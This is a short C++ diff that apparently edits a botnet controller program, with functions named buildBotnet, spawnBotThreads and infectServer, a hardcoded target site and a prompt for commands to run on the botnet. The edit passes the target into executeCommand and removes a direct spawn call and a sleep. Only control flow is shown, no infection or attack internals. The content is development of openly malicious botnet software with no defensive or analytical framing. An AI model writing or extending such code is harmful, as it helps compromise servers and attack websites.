@@ -80,7 +80,7 @@ void buildBotnet() {
     }
 }
 
-void executeCommand(const std::string& command) {
+void executeCommand(const std::string& command, const std::string& target) {
     if (command == "start") {
         spawnBotThreads(target);
     }
@@ -122,7 +122,6 @@ int main() {
     std::string target = "www.target-website.com";
 
     buildBotnet();
-    spawnBotThreads(target);
     infectServer(target);
 
     while (true) {
@@ -130,9 +129,7 @@ int main() {
         std::cout << "Enter a command to execute on the botnet: ";
         std::getline(std::cin, command);
 
-        executeCommand(command);
-
-        sleep(1);
+        executeCommand(command, target);
     }
 
     return 0;
